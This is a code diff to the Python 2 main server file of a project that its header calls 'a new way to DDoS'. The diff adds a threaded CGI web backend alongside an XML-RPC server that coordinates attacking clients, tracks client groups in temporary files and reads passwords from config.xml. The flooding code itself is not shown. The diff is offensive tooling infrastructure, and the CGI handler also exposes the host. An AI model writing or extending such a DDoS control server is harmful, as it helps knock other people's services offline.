@@ -2,13 +2,16 @@
 #ANON CANNON PROJECT - A NEW WAY TO DDoS
 #MAIN SERVER FILE
 #imports...
+#WARNING THIS VERSION USES A VERY BAD WAY ---
 import sys
 import urllib                                # For self interating with Webpages.
 from array import *                          # Important for Coding.
 import os                                    # See the comment on the line over.
-import threading                             # Don't want Multitasking?
+import thread                                # Don't want Multitasking?
 from xml.etree import ElementTree as ET      # For configuration.
 from SimpleXMLRPCServer import SimpleXMLRPCServer as Server # Client communication. 
+from BaseHTTPServer import HTTPServer        #For Web-backend
+from CGIHTTPServer import CGIHTTPRequestHandler
 # Main operating class.
 class main(object):
   #Function to detect the own IP.
@@ -32,8 +35,8 @@ Server ip is:""" + self.get_own_ip() + "\nServer OS is:" + sys.platform + "\nRoo
   def get_pw(self):
     return self.get_config(1)
   #Function to Getting Values out of the config.xml 
-  def get_config(self, number):
-    tree = ET.parse('config.xml')
+  def get_config(self, number, treepart='config.xml'):
+    tree = ET.parse(treepart)
     root = tree.getroot()
     return root[number].text
   def start_server(self):
@@ -108,8 +111,21 @@ Server ip is:""" + self.get_own_ip() + "\nServer OS is:" + sys.platform + "\nRoo
      self.write_to_file("tmp/group4", "0")
      self.write_to_file("tmp/lastgroup", "1")
      print "[+] Groups Files clean."
+     return 0
+def http_server(port):
+  serveraddress=("", int(port))
+  server = HTTPServer(serveraddress,
+                      CGIHTTPRequestHandler)
+  print "[+] HTTP Server launched."
+  server.serve_forever()
+  return 0
 #Starting interface...
 start = main()
 start.print_welcome_header()
 start.startup()
-start.start_server()
+#Starting the HTTP Server... 
+thread.start_new_thread(http_server, (start.get_config(6, 'config.xml'),))
+thread.start_new_thread(start.start_server, ())
+#A random while. Why? Don't want that the threads die...
+while True:
+  pass
